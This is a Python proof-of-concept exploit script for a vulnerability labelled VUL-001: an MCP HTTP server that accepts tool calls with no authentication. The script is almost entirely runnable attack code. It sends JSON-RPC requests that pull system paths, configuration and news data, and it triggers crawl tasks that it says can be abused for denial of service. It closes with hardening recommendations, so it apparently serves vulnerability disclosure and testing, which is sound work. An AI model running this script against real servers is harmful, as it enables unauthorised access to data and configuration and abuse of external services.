#!/usr/bin/env python3
"""
Proof of Concept: VUL-001 - No Authentication on MCP HTTP Server

This script demonstrates how an unauthenticated attacker can:
1. Access all MCP tools without credentials
2. Extract sensitive system information
3. Trigger resource-intensive operations
4. Read all historical data

SEVERITY: CRITICAL (CVSS 9.1)
CVE: CWE-306 (Missing Authentication for Critical Function)

Usage:
    python3 poc_no_auth.py <target_host> <target_port>

Example:
    python3 poc_no_auth.py localhost 3333
"""

import sys
import json
import requests
from typing import Dict, Any


class MCPAuthBypassExploit:
    """Exploit for unauthenticated MCP server access"""

    def __init__(self, host: str, port: int):
        self.base_url = f"http://{host}:{port}/mcp"
        self.session = requests.Session()

    def call_mcp_tool(self, method: str, params: Dict[str, Any] = None) -> Dict:
        """Call any MCP tool without authentication"""
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": 1
        }

        try:
            response = self.session.post(
                self.base_url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except Exception as e:
            return {"error": str(e)}

    def test_system_status(self):
        """Test 1: Extract system information without auth"""
        print("[*] Test 1: Extracting system status (no auth required)...")
        result = self.call_mcp_tool("get_system_status")

        if "result" in result:
            data = json.loads(result["result"])
            print("  [+] SUCCESS: System status retrieved!")
            print(f"  [!] Version: {data.get('system', {}).get('version')}")
            print(f"  [!] Project Root: {data.get('system', {}).get('project_root')}")
            print(f"  [!] Available Platforms: {len(data.get('platforms', []))}")
            return True
        else:
            print(f"  [-] FAILED: {result.get('error')}")
            return False

    def test_data_access(self):
        """Test 2: Access news data without auth"""
        print("\n[*] Test 2: Accessing latest news data (no auth required)...")
        result = self.call_mcp_tool("get_latest_news", {"limit": 10})

        if "result" in result:
            data = json.loads(result["result"])
            print(f"  [+] SUCCESS: Retrieved {len(data.get('news', []))} news items!")
            print("  [!] Sensitive data exposed without authentication")
            return True
        else:
            print(f"  [-] FAILED: {result.get('error')}")
            return False

    def test_trigger_crawl(self):
        """Test 3: Trigger resource-intensive crawl without auth"""
        print("\n[*] Test 3: Triggering crawl task (no auth required)...")
        result = self.call_mcp_tool("trigger_crawl", {
            "platforms": ["zhihu"],
            "save_to_local": False
        })

        if "result" in result:
            data = json.loads(result["result"])
            print("  [+] SUCCESS: Crawl task executed without authentication!")
            print(f"  [!] Fetched {data.get('total_news', 0)} news items")
            print("  [!] Attacker can spam this to DoS external API")
            return True
        else:
            print(f"  [-] FAILED: {result.get('error')}")
            return False

    def test_config_access(self):
        """Test 4: Access configuration without auth"""
        print("\n[*] Test 4: Accessing configuration (no auth required)...")
        result = self.call_mcp_tool("get_current_config", {"section": "all"})

        if "result" in result:
            data = json.loads(result["result"])
            print("  [+] SUCCESS: Configuration retrieved!")
            print(f"  [!] Exposed configuration sections: {list(data.keys())}")
            print("  [!] Platform weights, crawler settings exposed")
            return True
        else:
            print(f"  [-] FAILED: {result.get('error')}")
            return False

    def run_all_tests(self):
        """Run all exploitation tests"""
        print("="*70)
        print(" PoC: Unauthenticated Access to MCP Server (VUL-001)")
        print("="*70)
        print(f"Target: {self.base_url}")
        print()

        tests = [
            self.test_system_status,
            self.test_data_access,
            self.test_trigger_crawl,
            self.test_config_access
        ]

        results = [test() for test in tests]

        print("\n" + "="*70)
        print(f" Results: {sum(results)}/{len(results)} tests successful")
        print("="*70)

        if all(results):
            print("\n[!!!] CRITICAL VULNERABILITY CONFIRMED [!!!]")
            print("The MCP server has ZERO authentication!")
            print("\nATTACKER CAPABILITIES:")
            print("  • Read all news data (current + historical)")
            print("  • Extract system configuration and paths")
            print("  • Trigger unlimited crawl tasks (DoS)")
            print("  • Monitor system status and cache")
            print("  • No logging or access controls")
            print("\nRECOMMENDATION:")
            print("  1. IMMEDIATELY disable HTTP mode")
            print("  2. Implement API key authentication (minimum)")
            print("  3. Add OAuth2/JWT tokens (recommended)")
            print("  4. Enable TLS with client certificates")
            print("  5. Add IP allowlisting")
        else:
            print("\n[*] Some tests failed - server might be down or configured differently")


def main():
    if len(sys.argv) != 3:
        print("Usage: python3 poc_no_auth.py <host> <port>")
        print("Example: python3 poc_no_auth.py localhost 3333")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    exploit = MCPAuthBypassExploit(host, port)
    exploit.run_all_tests()


if __name__ == "__main__":
    main()
